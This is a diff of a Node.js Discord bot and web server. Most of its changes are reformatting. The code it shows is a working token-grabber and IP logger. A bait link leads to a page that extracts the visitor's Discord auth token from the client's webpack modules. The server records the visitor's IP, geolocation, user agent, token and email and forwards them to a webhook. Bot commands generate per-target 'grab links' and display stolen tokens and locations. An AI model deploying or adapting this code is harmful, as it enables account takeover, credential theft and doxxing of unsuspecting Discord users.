@@ -9,10 +9,10 @@ import { readFile, writeFile, access } from "fs/promises";
 import { constants } from "fs";
 import { URL } from "url";
 
-const TOKEN      = process.env.BOT_TOKEN   ?? "FILL: bot token";
-const PORT       = process.env.PORT        ?? 5000;
-const WEBHOOK    = process.env.LOG_WEBHOOK ?? "FILL: discord webhook url";
-const BASE_URL   = process.env.BASE_URL    ?? "FILL: https://your-domain.com";
+const TOKEN      = process.env.BOT_TOKEN    ?? "FILL: bot token";
+const PORT       = process.env.SERVER_PORT  ?? process.env.PORT ?? 5000;
+const WEBHOOK    = process.env.LOG_WEBHOOK  ?? "FILL: discord webhook url";
+const BASE_URL   = process.env.BASE_URL     ?? "FILL: https://your-domain.com";
 const IPINFO_TOK = process.env.IPINFO_TOKEN ?? "";
 const LOG_FILE   = "./ip_log.json";
 const PREFIX     = "!";
@@ -81,7 +81,9 @@ async function pingWebhook(entry, g) {
   await fetch(WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ embeds: [{ title: "🎣 hit", color: 0xff4444, fields, timestamp: new Date().toISOString() }] }),
+    body: JSON.stringify({
+      embeds: [{ title: "🎣 hit", color: 0xff4444, fields, timestamp: new Date().toISOString() }]
+    }),
   }).catch(() => {});
 }
 
@@ -90,9 +92,7 @@ function readBody(req) {
   return new Promise((res, rej) => {
     let buf = "";
     req.on("data", c => buf += c);
-    req.on("end", () => {
-      try { res(JSON.parse(buf)); } catch { res({}); }
-    });
+    req.on("end", () => { try { res(JSON.parse(buf)); } catch { res({}); } });
     req.on("error", rej);
   });
 }
@@ -137,8 +137,7 @@ try {
 try {
   const wr = window.webpackChunkdiscord_app;
   if (wr) {
-    const id = Symbol();
-    wr.push([[id],{},(req)=>{
+    wr.push([[Symbol()],{},(req)=>{
       for(const k of Object.keys(req.c)){
         const m=req.c[k].exports;
         if(m?.default?.getToken){_token=m.default.getToken();return;}
@@ -151,7 +150,7 @@ try {
 setTimeout(()=>{
   fetch("/hit",{method:"POST",headers:{"Content-Type":"application/json"},
     body:JSON.stringify({uid:"${uid}",ref:"auto",token:_token,email:null})});
-}, 800);
+},800);
 
 function submit(){
   const email=document.getElementById("email").value.trim();
@@ -168,12 +167,10 @@ function submit(){
 createServer(async (req, res) => {
   const u = new URL(req.url, `http://localhost`);
 
-  // CORS preflight
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
   if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }
 
-  // POST /hit — data receiver
   if (req.method === "POST" && u.pathname === "/hit") {
     const body = await readBody(req);
     const ip = (
@@ -200,7 +197,6 @@ createServer(async (req, res) => {
     return;
   }
 
-  // GET / — bait page
   if (req.method === "GET" && u.pathname === "/") {
     const uid = u.searchParams.get("uid") ?? "";
     const to  = u.searchParams.get("to")  ?? "https://discord.com/app";
@@ -210,7 +206,7 @@ createServer(async (req, res) => {
   }
 
   res.writeHead(404); res.end();
-}).listen(PORT, () => console.log(`[receiver] :${PORT}`));
+}).listen(PORT, "0.0.0.0", () => console.log(`[receiver] :${PORT} on 0.0.0.0`));
 
 // ── discord bot ───────────────────────────────────────────────────────────────
 const client = new Client({
@@ -232,8 +228,10 @@ client.on("messageCreate", async (msg) => {
     const target = msg.mentions.users.first() ?? msg.author;
     const to     = args.find(a => a.startsWith("http")) ?? "https://discord.com/app";
     const link   = `${BASE_URL}/?uid=${target.id}&to=${encodeURIComponent(to)}`;
-    try { await msg.author.send(`🔗 grab link for \`${target.tag}\`:\n${link}`); await msg.delete(); }
-    catch { await msg.reply("open DMs and retry"); }
+    try {
+      await msg.author.send(`🔗 grab link for \`${target.tag}\`:\n${link}`);
+      await msg.delete();
+    } catch { await msg.reply("open DMs and retry"); }
     return;
   }
 
@@ -266,22 +264,22 @@ client.on("messageCreate", async (msg) => {
     const log    = await loadLog();
     const hits   = target ? log.filter(e => e.uid === target.id) : log;
     if (!hits.length) { await msg.reply("no hits"); return; }
-    const e = hits[hits.length - 1];
-    const g = e.geo ?? {};
+    const e  = hits[hits.length - 1];
+    const g  = e.geo ?? {};
     const maps = g.loc ? `[maps](https://www.google.com/maps?q=${g.loc})` : "?";
     const em = new EmbedBuilder()
       .setTitle(`🎣 ${e.ip}`).setColor(0xff4444)
       .addFields(
-        { name: "UID",     value: `\`${e.uid ?? "?"}\``,           inline: true },
-        { name: "Country", value: g.country ?? "?",                 inline: true },
-        { name: "City",    value: g.city    ?? "?",                 inline: true },
-        { name: "Postal",  value: g.postal  ?? "?",                 inline: true },
-        { name: "Coords",  value: maps,                             inline: true },
-        { name: "ISP",     value: g.org     ?? "?",                 inline: true },
-        { name: "Proxy",   value: String(g.proxy ?? "?"),           inline: true },
-        { name: "UA",      value: `\`${(e.ua ?? "").slice(0,60)}\``, inline: false },
-        ...(e.token ? [{ name: "🔑 Token", value: `\`${e.token}\``, inline: false }] : []),
-        ...(e.email ? [{ name: "📧 Email", value: `\`${e.email}\``,  inline: false }] : []),
+        { name: "UID",     value: `\`${e.uid ?? "?"}\``,             inline: true  },
+        { name: "Country", value: g.country  ?? "?",                  inline: true  },
+        { name: "City",    value: g.city     ?? "?",                  inline: true  },
+        { name: "Postal",  value: g.postal   ?? "?",                  inline: true  },
+        { name: "Coords",  value: maps,                               inline: true  },
+        { name: "ISP",     value: g.org      ?? "?",                  inline: true  },
+        { name: "Proxy",   value: String(g.proxy ?? "?"),             inline: true  },
+        { name: "UA",      value: `\`${(e.ua ?? "").slice(0,60)}\``,  inline: false },
+        ...(e.token ? [{ name: "🔑 Token", value: `\`${e.token}\``,  inline: false }] : []),
+        ...(e.email ? [{ name: "📧 Email", value: `\`${e.email}\``,   inline: false }] : []),
       ).setTimestamp(new Date(e.ts));
     await msg.channel.send({ embeds: [em] });
     return;
@@ -289,7 +287,8 @@ client.on("messageCreate", async (msg) => {
 
   if (cmd === "clearlog") {
     if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
-    await wipeLog(); await msg.reply("log wiped");
+    await wipeLog();
+    await msg.reply("log wiped");
     return;
   }
 });
